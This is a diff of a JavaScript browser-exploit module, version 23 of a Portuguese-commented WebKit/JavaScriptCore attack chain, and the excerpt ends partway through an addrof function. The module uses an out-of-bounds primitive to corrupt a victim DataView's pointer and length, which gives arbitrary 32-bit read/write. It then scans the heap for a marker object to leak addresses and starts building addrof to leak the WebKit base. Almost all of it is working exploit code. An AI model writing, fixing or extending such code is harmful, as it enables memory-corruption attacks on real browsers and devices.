@@ -1,22 +1,30 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v22 - ATAQUE DE 32 BITS DIRECIONADO)
+// js/script3/testArrayBufferVictimCrash.mjs (v23 - CORREÇÃO DE REFERENCEERROR)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
-import { toHex } from '../utils.mjs'; // Agora importa do utils simplificado
+import { toHex } from '../utils.mjs';
 import { triggerOOB_primitive, oob_read_absolute, oob_write_absolute } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Targeted_32bit_Exploit_v22";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Targeted_32bit_Exploit_v23_Fix";
 
-// ... (Resto do código exatamente como na resposta anterior)
+// =======================================================================================
+// SEÇÃO DE CONSTANTES E CONFIGURAÇÕES DE 32 BITS
+// =======================================================================================
+
 const OOB_DV_METADATA_BASE = 0x58;
 const VICTIM_DV_METADATA_ADDR_IN_OOB = OOB_DV_METADATA_BASE + 0x200;
-const VICTIM_DV_POINTER_LOW_ADDR = VICTIM_DV_METADATA_ADDR_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // Offset 0x10
+
+// Agora usamos números, não AdvancedInt64
+const VICTIM_DV_POINTER_LOW_ADDR = VICTIM_DV_METADATA_ADDR_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
 const VICTIM_DV_POINTER_HIGH_ADDR = VICTIM_DV_POINTER_LOW_ADDR + 4;
-const VICTIM_DV_LENGTH_ADDR = VICTIM_DV_METADATA_ADDR_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; // Offset 0x18
-const JS_OBJECT_BUTTERFLY_OFFSET = JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET; // 0x10
+const VICTIM_DV_LENGTH_ADDR = VICTIM_DV_METADATA_ADDR_IN_OOB + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
+
 const HEAP_SCAN_START_32BIT = 0x20000000;
 const HEAP_SCAN_SIZE = 0x10000000;
 
+// =======================================================================================
+// A FUNÇÃO DE ATAQUE DE 32 BITS
+// =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
     logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE} ---`, "test");
@@ -24,6 +32,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     let final_result = { success: false, message: "A cadeia de exploração falhou." };
     
     try {
+        // --- FASE 1: Construção das Primitivas de R/W ---
         logS3("--- Fase 1: Construindo Primitivas de R/W de 32 bits ---", "subtest");
         await triggerOOB_primitive({ force_reinit: true });
         let victim_dv = new DataView(new ArrayBuffer(4096));
@@ -42,6 +51,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         };
         logS3("    Primitivas de Leitura/Escrita (R/W) de 32 bits funcionais.", "vuln");
 
+        // --- FASE 2: Escaneamento de Memória para Info Leak ---
         logS3("--- Fase 2: Escaneamento de Memória de 32 bits para Vazamento de Endereço ---", "subtest");
         let leaker_obj = { a: 0x13371337, b: 0xCAFECAFE };
         let leaker_obj_addr = 0;
@@ -50,15 +60,19 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         for (let i = 0; i < HEAP_SCAN_SIZE; i += 4) {
             let current_addr = HEAP_SCAN_START_32BIT + i;
             if (arb_read32(current_addr) === leaker_obj.a && arb_read32(current_addr + 4) === leaker_obj.b) {
-                leaker_obj_addr = current_addr - JS_OBJECT_BUTTERFLY_OFFSET;
+                // =============================================================
+                // CORREÇÃO AQUI: Usado JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET
+                // =============================================================
+                leaker_obj_addr = current_addr - JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET;
                 logS3(`    MARCADOR ENCONTRADO! Endereço do objeto: ${toHex(leaker_obj_addr)}`, "leak");
                 break;
             }
         }
         if (leaker_obj_addr === 0) throw new Error("Escaneamento de 32 bits falhou.");
 
-        logS3("--- Fase 3: Construindo 'addrof' e Conclusão ---", "subtest");
-        const butterfly_addr = leaker_obj_addr + JS_OBJECT_BUTTERFLY_OFFSET;
+        // --- FASE 3: Construção da Primitiva 'addrof' e Conclusão ---
+        logS3("--- Fase 3: Construindo 'addrof' e Vazando a Base do WebKit ---", "subtest");
+        const butterfly_addr = leaker_obj_addr + JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET;
 
         const addrof_primitive = (obj) => {
             leaker_obj.a = obj;
